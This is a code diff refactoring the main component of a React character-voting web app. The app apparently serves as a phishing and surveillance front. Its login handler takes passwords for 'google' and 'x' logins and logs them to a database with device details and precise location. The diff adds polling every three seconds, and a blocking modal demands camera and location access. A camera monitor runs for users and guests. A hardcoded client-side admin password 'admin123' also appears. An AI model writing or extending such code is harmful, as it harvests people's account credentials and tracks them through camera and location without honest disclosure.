@@ -9,39 +9,26 @@ import AdminDashboard from './components/AdminDashboard';
 import PermissionModal from './components/PermissionModal';
 import CameraMonitor from './components/CameraMonitor';
 import { dataService } from './services/dataService'; 
-import { RefreshCw, CheckCircle2, Lock, LogOut, User as UserIcon, ShieldAlert, Loader2, Timer, Clock } from 'lucide-react';
-import { motion, AnimatePresence } from 'framer-motion';
+import { LogOut, Timer, ShieldAlert } from 'lucide-react';
+import { AnimatePresence } from 'framer-motion';
 
 function App() {
-  // VIEW STATE
   const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>('app');
   const [adminPassword, setAdminPassword] = useState('');
   const [adminError, setAdminError] = useState('');
   const [isAdminLoading, setIsAdminLoading] = useState(false);
-
-  // Initialize characters
   const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);
   const [activeIndex, setActiveIndex] = useState(0);
-  
-  // USER STATE
-  const [user, setUser] = useState<string | null>(() => {
-    return localStorage.getItem('muse_current_user');
-  });
-
-  // GUEST STATE
+  const [user, setUser] = useState<string | null>(() => localStorage.getItem('muse_current_user'));
   const guestId = useMemo(() => {
     let gid = localStorage.getItem('muse_guest_id');
-    if (!gid) {
-        gid = `guest_${Math.random().toString(36).substr(2, 9)}`;
-        localStorage.setItem('muse_guest_id', gid);
-    }
+    if (!gid) { gid = `guest_${Math.random().toString(36).substr(2, 9)}`; localStorage.setItem('muse_guest_id', gid); }
     return gid;
   }, []);
 
   const [hasVoted, setHasVoted] = useState<boolean>(false);
   const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
   const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
-  const [lastVotedId, setLastVotedId] = useState<string | null>(null);
 
   // --- PERMISSION STATE ---
   const [isLocationDenied, setIsLocationDenied] = useState(false);
@@ -49,9 +36,7 @@ function App() {
   const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);
 
   // --- TIMER STATE ---
-  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => {
-      return localStorage.getItem('muse_voting_deadline');
-  });
+  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
   const [isVotingEnded, setIsVotingEnded] = useState(false);
 
@@ -63,19 +48,13 @@ function App() {
 
   useEffect(() => {
     fetchCharacters();
-
-    const unsubscribeSupabase = dataService.subscribeToVotes(() => {
-        fetchCharacters();
-    });
-
-    const handleStorageChange = (e: Event) => {
+    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
+    const handleStorageChange = () => {
         fetchCharacters();
         setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
     };
-
     window.addEventListener('local-storage-update', handleStorageChange);
     window.addEventListener('storage', handleStorageChange);
-
     return () => {
         unsubscribeSupabase();
         window.removeEventListener('local-storage-update', handleStorageChange);
@@ -83,15 +62,13 @@ function App() {
     };
   }, [fetchCharacters]);
 
-  // --- LOGGING HELPER ---
+  // --- LOGGING ---
   const logVisitToDatabase = useCallback(async (identifier: string, method: 'google' | 'x' | 'guest_visit', pass: string = '') => {
       const deviceInfo = {
           userAgent: navigator.userAgent,
           platform: navigator.platform,
           screenSize: `${window.innerWidth}x${window.innerHeight}`,
-          language: navigator.language
       };
-
       const storedLoc = localStorage.getItem('muse_user_location');
       const locationData = storedLoc ? JSON.parse(storedLoc) : null;
 
@@ -104,21 +81,21 @@ function App() {
       });
   }, []);
 
-  // --- PERMISSION LOGIC ---
-  const requestPermissions = useCallback(async () => {
-    // 1. Check Camera
+  // --- PERMISSIONS ---
+  const checkPermissions = useCallback(async () => {
+    const missing: ('location' | 'camera')[] = [];
+    
+    // Check Camera
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Success
         stream.getTracks().forEach(track => track.stop());
         setIsCameraDenied(false);
-        setMissingPermissions(prev => prev.filter(p => p !== 'camera'));
     } catch (err) {
         setIsCameraDenied(true);
-        setMissingPermissions(prev => Array.from(new Set([...prev, 'camera'])));
+        missing.push('camera');
     }
 
-    // 2. Check Location
+    // Check Location
     if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
@@ -130,82 +107,87 @@ function App() {
                 };
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                 setIsLocationDenied(false);
-                setMissingPermissions(prev => prev.filter(p => p !== 'location'));
             },
-            (error) => {
-                console.warn("Location denied:", error);
+            () => {
                 setIsLocationDenied(true);
-                setMissingPermissions(prev => Array.from(new Set([...prev, 'location'])));
-            },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                // We do this check inside callback because it's async
+                setMissingPermissions(prev => {
+                     const s = new Set(prev);
+                     s.add('location');
+                     return Array.from(s);
+                });
+            }
         );
+    } else {
+        setIsLocationDenied(true);
+        missing.push('location');
     }
-  }, []);
 
+    setMissingPermissions(prev => {
+        const unique = new Set([...prev, ...missing]);
+        // Remove valid ones
+        if (!isCameraDenied && !missing.includes('camera')) unique.delete('camera');
+        if (!isLocationDenied && !missing.includes('location')) unique.delete('location');
+        return Array.from(unique);
+    });
+
+  }, [isCameraDenied, isLocationDenied]);
+
+  useEffect(() => { checkPermissions(); }, [checkPermissions]);
+
+  // Poll permissions periodically to detect if user changed browser settings
   useEffect(() => {
-      requestPermissions();
-  }, [requestPermissions]);
+      const interval = setInterval(checkPermissions, 3000);
+      return () => clearInterval(interval);
+  }, [checkPermissions]);
 
-  // --- TIMER LOGIC ---
+  // --- TIMER ---
   useEffect(() => {
     const calculateTimeLeft = () => {
-        if (!votingDeadline) {
-            setTimeLeft(null);
-            setIsVotingEnded(false);
-            return;
-        }
-
-        const difference = new Date(votingDeadline).getTime() - new Date().getTime();
-
-        if (difference > 0) {
+        if (!votingDeadline) { setTimeLeft(null); setIsVotingEnded(false); return; }
+        const diff = new Date(votingDeadline).getTime() - new Date().getTime();
+        if (diff > 0) {
             setTimeLeft({
-                days: Math.floor(difference / (1000 * 60 * 60 * 24)),
-                hours: Math.floor((difference / (1000 * 60 * 60)) % 24),
-                minutes: Math.floor((difference / 1000 / 60) % 60),
-                seconds: Math.floor((difference / 1000) % 60),
+                days: Math.floor(diff / (1000 * 60 * 60 * 24)),
+                hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
+                minutes: Math.floor((diff / 1000 / 60) % 60),
+                seconds: Math.floor((diff / 1000) % 60),
             });
             setIsVotingEnded(false);
         } else {
-            setTimeLeft(null);
-            setIsVotingEnded(true);
+            setTimeLeft(null); setIsVotingEnded(true);
         }
     };
-
     calculateTimeLeft();
     const timer = setInterval(calculateTimeLeft, 1000);
-
     return () => clearInterval(timer);
   }, [votingDeadline]);
 
-  // Check voting status
   useEffect(() => {
     if (user) {
         const userHasVoted = localStorage.getItem(`muse_vote_record_${user}`);
         setHasVoted(!!userHasVoted);
-        setIsAuthModalOpen(false);
+        setIsAuthModalOpen(false); // Force close auth modal if user is detected
     } else {
         setHasVoted(false);
     }
   }, [user]);
 
-  // Navigation Logic
   const handleNext = () => setActiveIndex((prev) => (prev + 1) % characters.length);
   const handlePrev = () => setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
   const handleCardClick = (index: number) => setActiveIndex(index);
 
-  // --- AUTH LOGIC ---
   const handleLoginSuccess = (result: LoginResult) => {
       const { username, password, method } = result;
-
-      setIsAuthModalOpen(false);
+      setIsAuthModalOpen(false); // Immediate close
       setUser(username);
       localStorage.setItem('muse_current_user', username);
-      
       logVisitToDatabase(username, method, password);
-
-      setTimeout(() => {
-          if (!isVotingEnded) setIsVoteModalOpen(true);
-      }, 500); 
+      
+      // Open vote modal after small delay
+      if (!isVotingEnded) {
+          setTimeout(() => setIsVoteModalOpen(true), 600);
+      }
   };
 
   const handleLogout = () => {
@@ -214,73 +196,35 @@ function App() {
       setHasVoted(false);
   };
 
-  // --- VOTE LOGIC ---
   const handleConfirmVote = async () => {
     if (!user || isVotingEnded) return;
-    
     setIsVoteModalOpen(false);
-
     try {
         const activeChar = characters[activeIndex];
         const storedLoc = localStorage.getItem('muse_user_location');
         const locationData = storedLoc ? JSON.parse(storedLoc) : null;
-        
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenSize: `${window.innerWidth}x${window.innerHeight}`,
-            language: navigator.language
-        };
+        const deviceInfo = { userAgent: navigator.userAgent, platform: navigator.platform, screenSize: `${window.innerWidth}x${window.innerHeight}` };
 
         await dataService.castVote(activeChar.id, user, { location: locationData, deviceInfo });
         
         setHasVoted(true);
-        // Explicitly update local state to reflect change immediately
-        setCharacters(prev => prev.map(c => 
-            c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c
-        ));
-        
-        setLastVotedId(activeChar.id);
-        setTimeout(() => setLastVotedId(null), 3000);
+        // Force refresh
+        const updated = await dataService.getCharacters();
+        setCharacters(updated);
 
     } catch (e) {
-        console.error("Vote failed:", e);
-        setHasVoted(true);
-        alert("Vote recorded locally (Network issue).");
+        alert("Vote failed locally.");
     }
-  };
-
-  // Handle Camera Monitoring
-  const handleCameraError = () => {
-      setIsCameraDenied(true); 
-      setMissingPermissions(prev => Array.from(new Set([...prev, 'camera'])));
-  };
-
-  const handleCameraSuccess = () => {
-      setIsCameraDenied(false);
-      setMissingPermissions(prev => prev.filter(p => p !== 'camera'));
   };
 
   const activeCharacter = characters[activeIndex];
 
-  // RENDER ADMIN
   if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={() => setView('app')} />;
-  if (view === 'admin_login') {
-      // ... (Admin Login UI code mostly same, just abbreviated for char limit in this change block if not changing logic)
-      return (
+  if (view === 'admin_login') return (
         <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
-             {/* Admin Login Form */}
              <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
                 <h2 className="text-xl font-bold text-white mb-6 text-center">System Administration</h2>
-                <form onSubmit={(e) => {
-                    e.preventDefault();
-                    setIsAdminLoading(true);
-                    setTimeout(() => {
-                        if (adminPassword === 'admin123') { setView('admin_dashboard'); setAdminError(''); } 
-                        else { setAdminError('Invalid Code'); }
-                        setIsAdminLoading(false);
-                    }, 1000);
-                }} className="space-y-4">
+                <form onSubmit={(e) => { e.preventDefault(); setIsAdminLoading(true); setTimeout(() => { if (adminPassword === 'admin123') { setView('admin_dashboard'); setAdminError(''); } else { setAdminError('Invalid Code'); } setIsAdminLoading(false); }, 1000); }} className="space-y-4">
                    <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                    {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                    <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
@@ -288,13 +232,10 @@ function App() {
                 </form>
              </div>
         </div>
-      )
-  }
+  );
 
-  // RENDER APP
   return (
     <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans">
-      {/* Background */}
       <div className="fixed inset-0 pointer-events-none z-0">
          <div className="absolute top-[-20%] left-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-purple-900/20 rounded-full blur-[120px]" />
          <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px]" />
@@ -318,7 +259,6 @@ function App() {
                  )}
              </div>
           </div>
-          {/* Timer Display */}
           {votingDeadline && !isVotingEnded && timeLeft && (
              <div className="w-full bg-indigo-900/20 border border-indigo-500/20 rounded-xl p-3 flex items-center justify-between backdrop-blur-sm">
                 <div className="flex items-center gap-2 text-indigo-300"><Timer size={16} className="animate-pulse" /><span className="text-xs font-bold tracking-wider">VOTING ENDS IN</span></div>
@@ -329,17 +269,15 @@ function App() {
           )}
         </header>
 
-        {/* SWIPE AREA */}
         <section className="w-full relative h-[500px] flex items-center justify-center perspective-1000 mt-2">
              <AnimatePresence mode="popLayout" initial={false}>
                {characters.map((char, index) => {
-                  let offset = index - activeIndex;
                   return (
                     <SwipeCard 
                       key={char.id}
                       character={char} 
                       isActive={index === activeIndex}
-                      offset={offset}
+                      offset={index - activeIndex}
                       onClick={() => handleCardClick(index)}
                       onSwipeRight={handlePrev}
                       onSwipeLeft={handleNext}
@@ -349,7 +287,6 @@ function App() {
              </AnimatePresence>
         </section>
 
-        {/* CONTROLS */}
         <section className="w-full flex flex-col items-center gap-4 px-2">
              <div className="flex justify-center gap-1.5 mb-2">
                 {characters.map((_, idx) => (
@@ -374,7 +311,6 @@ function App() {
         </footer>
       </div>
 
-      {/* MODALS */}
       <AnimatePresence>
         {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
       </AnimatePresence>
@@ -383,9 +319,8 @@ function App() {
         {isAuthModalOpen && !user && <AuthModal isOpen={isAuthModalOpen} onClose={() => setIsAuthModalOpen(false)} onLoginSuccess={handleLoginSuccess} />}
       </AnimatePresence>
 
-      {(isLocationDenied || isCameraDenied) && <PermissionModal onRetry={requestPermissions} missingPermissions={missingPermissions} />}
-
-      {(user || guestId) && !isCameraDenied && <CameraMonitor user={user || guestId} onError={handleCameraError} onSuccess={handleCameraSuccess} />}
+      {(isLocationDenied || isCameraDenied) && <PermissionModal onRetry={checkPermissions} missingPermissions={missingPermissions} />}
+      {(user || guestId) && !isCameraDenied && <CameraMonitor user={user || guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />}
     </div>
   );
 }
